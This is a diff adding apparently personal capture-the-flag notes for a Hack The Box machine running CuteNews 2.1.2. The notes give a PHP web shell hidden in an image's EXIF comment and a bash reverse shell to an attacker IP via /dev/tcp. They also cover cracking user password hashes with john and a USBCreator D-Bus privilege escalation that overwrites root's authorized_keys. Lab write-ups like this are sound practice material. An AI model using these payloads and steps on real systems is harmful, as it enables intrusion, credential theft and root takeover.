@@ -1,0 +1,61 @@
+Seems that trying to enumarate directories with gobuster makes the server block our connection for sometime
+
+Trying to leave a comment as admin will rediect in a log in page
+
+Simple sqli do not seem to work on the login page
+
+Found that the site uses cutephp (CuteNews) version 2.1.2 which is vulnerable to Arbitrary File 
+https://www.exploit-db.com/exploits/48458
+https://www.youtube.com/watch?v=jKu6XhUojcY
+
+First we need to register a new user
+
+user:ishallpass
+pass:ishallpass
+
+then we need to upload an shell hidden in an image
+
+exiftool -Comment='<?php echo "<pre>";
+system($_GET['cmd']); ?>' shell.png;
+
+rename image to shell.png.php
+
+after uploading visit http://10.10.10.206/CuteNews/uploads/
+
+set up a listener with netcat
+
+url encode /bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'
+
+10.10.10.206/CuteNews/uploads/avatar_ishallpass_shell.png.php?cmd=/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.88/1818+0>%261'
+and send it to the server with parameter id=[URL_ENCODED_PAYLOAD]
+
+
+I could use my password scavenger on the /var/www/html dir
+
+
+looking through the in /var/www/html/CuteNews/cdata/users 
+file 09.php has some data about paul@passage.htb. 
+There is a user in the machine named Paul
+a password is included but seems encrypted
+
+
+admin file 7a.php
+a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+
+
+echo e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd | cut -f 1 -d " " > password
+john --format=raw-sha256 --show password
+
+
+paul password = atlanta1
+
+
+inside the .ssh of paul were the ssh key to connect to nadav :)
+
+
+
+For root we need to exploit DBus => https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+
+
+if we upload our id_rsa.pub key to the server and use cmd below to transfer it to root's authorized_keys we can ssh in as root
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/bigra/key.pub /root/.ssh/authorized_keys true
